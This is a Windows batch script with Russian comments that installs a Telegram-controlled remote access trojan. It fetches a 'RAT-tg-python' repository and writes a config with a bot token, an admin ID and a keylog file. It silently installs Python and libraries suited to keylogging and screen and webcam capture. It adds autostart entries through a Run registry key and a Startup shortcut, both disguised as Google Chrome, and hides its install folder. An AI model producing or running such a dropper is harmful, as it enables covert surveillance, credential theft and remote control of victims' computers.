@echo off
setlocal enabledelayedexpansion

REM Настройки
set "BOT_TOKEN=..."
set "ADMIN_ID=..."

set "REPO_URL=https://github.com/kripersi/RAT-tg-python/archive/refs/heads/main.zip"
set "INSTALL_DIR=%LocalAppData%\RAT_browser"
set "PYTHON_PATH=%LocalAppData%\Programs\Python\Python312\pythonw.exe"
set "SCRIPT_PATH=%INSTALL_DIR%\main.py"
set "CONFIG_PATH=%INSTALL_DIR%\config.py"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "ZIP_PATH=%TEMP%\repo.zip"
set "EXTRACT_DIR=%TEMP%\repo_extract"

REM Создание директории
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

REM КОПИРОВАНИЕ ИКОНКИ GOOGLE CHROME
if exist "%~dp0googlechrome.ico" (
    copy "%~dp0googlechrome.ico" "%INSTALL_DIR%\googlechrome.ico" >nul 2>&1
    set "ICON_PATH=%INSTALL_DIR%\googlechrome.ico"
) else (
    REM Если иконка не найдена, используем системную
    set "ICON_PATH=C:\Windows\System32\imageres.dll"
    set "ICON_INDEX=70"
)

REM Скачивание репозитория
curl -s -L -o "%ZIP_PATH%" "%REPO_URL%" >nul 2>&1

REM Распаковка
powershell -command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force" >nul 2>&1

REM Копирование файлов в целевую папку
xcopy "%EXTRACT_DIR%\RAT-tg-python-main\*" "%INSTALL_DIR%\" /E /Y /Q >nul 2>&1

REM Создание config.py
echo import os > "%CONFIG_PATH%"
echo import telepot >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Основные настройки >> "%CONFIG_PATH%"
echo KNOWN_IDS = ['%ADMIN_ID%'] >> "%CONFIG_PATH%"
echo TOKEN = '%BOT_TOKEN%' >> "%CONFIG_PATH%"
echo bot = telepot.Bot(TOKEN) >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Пути >> "%CONFIG_PATH%"
echo USER = os.environ.get("USERNAME") >> "%CONFIG_PATH%"
echo APPDATA = os.environ.get("APPDATA") >> "%CONFIG_PATH%"
echo BASE_DIR = os.getcwd() >> "%CONFIG_PATH%"
echo LOG_DIR = os.path.join(BASE_DIR, 'logs') >> "%CONFIG_PATH%"
echo SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts') >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Файлы логов >> "%CONFIG_PATH%"
echo LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt') >> "%CONFIG_PATH%"
echo KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt') >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Убедимся, что папки существуют >> "%CONFIG_PATH%"
echo os.makedirs(LOG_DIR, exist_ok=True) >> "%CONFIG_PATH%"
echo os.makedirs(SCRIPTS_DIR, exist_ok=True) >> "%CONFIG_PATH%"

REM Очистка временных файлов
del "%ZIP_PATH%" >nul 2>&1
rmdir /s /q "%EXTRACT_DIR%" >nul 2>&1

REM Очистка остатков Python 3.12 из реестра
reg delete "HKCU\Software\Python\PythonCore\3.12" /f >nul 2>&1
reg delete "HKLM\Software\Python\PythonCore\3.12" /f >nul 2>&1

REM Проверка Python
if not exist "%PYTHON_PATH%" (
    curl -o "%TEMP%\python312.exe" "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    start /wait "" "%TEMP%\python312.exe" /quiet /norestart InstallAllUsers=0 PrependPath=1 Include_pip=1
    del "%TEMP%\python312.exe" >nul 2>&1
)

REM Проверка что Python установился
if not exist "%PYTHON_PATH%" (
    pause
    goto :end
)

REM Установка необходимых пакетов
"%PYTHON_PATH%" -m pip install telepot pynput opencv-python pyautogui Pillow keyboard requests --quiet >nul 2>&1

REM НАСТРОЙКА АВТОЗАГРУЗКИ С ИКОНКОЙ GOOGLE CHROME
REM Удаляем старые записи
reg delete "%REG_KEY%" /v "WindowsUpdate" /f >nul 2>&1
reg delete "%REG_KEY%" /v "pythonw" /f >nul 2>&1
reg delete "%REG_KEY%" /v "Windows Update Service" /f >nul 2>&1
reg delete "%REG_KEY%" /v "Google Chrome" /f >nul 2>&1
reg delete "%REG_KEY%" /v "GoogleUpdate" /f >nul 2>&1

REM Создаем VBS скрипт для настройки автозагрузки
set "VBS_PATH=%TEMP%\setup_autostart.vbs"
(
echo Set ws = CreateObject^("WScript.Shell"^)
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo.
echo pythonPath = "%PYTHON_PATH%"
echo scriptPath = "%SCRIPT_PATH%"
echo iconPath = "%ICON_PATH%"
echo.
echo regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Google Chrome"
echo regValue = """" ^& pythonPath ^& """ """ ^& scriptPath ^& """"
echo ws.RegWrite regPath, regValue, "REG_SZ"
echo.
echo startupPath = ws.SpecialFolders^("Startup"^)
echo shortcutPath = startupPath ^& "\Google Chrome.lnk"
echo.
echo Set shortcut = ws.CreateShortcut^(shortcutPath^)
echo shortcut.TargetPath = pythonPath
echo shortcut.Arguments = """" ^& scriptPath ^& """"
echo shortcut.Description = "Google Chrome"
echo.
echo if fso.FileExists^(iconPath^) Then
echo     shortcut.IconLocation = iconPath
echo Else
echo     shortcut.IconLocation = "C:\Windows\System32\imageres.dll, 70"
echo End If
echo.
echo shortcut.WindowStyle = 7
echo shortcut.Save
) > "%VBS_PATH%"

REM Запускаем скрипт
cscript //nologo "%VBS_PATH%"
del "%VBS_PATH%" >nul 2>&1

REM Скрытые атрибуты
attrib +h "%INSTALL_DIR%" /s /d >nul 2>&1

REM Запуск бота
start "" "%PYTHON_PATH%" "%SCRIPT_PATH%"

pause
:end
endlocal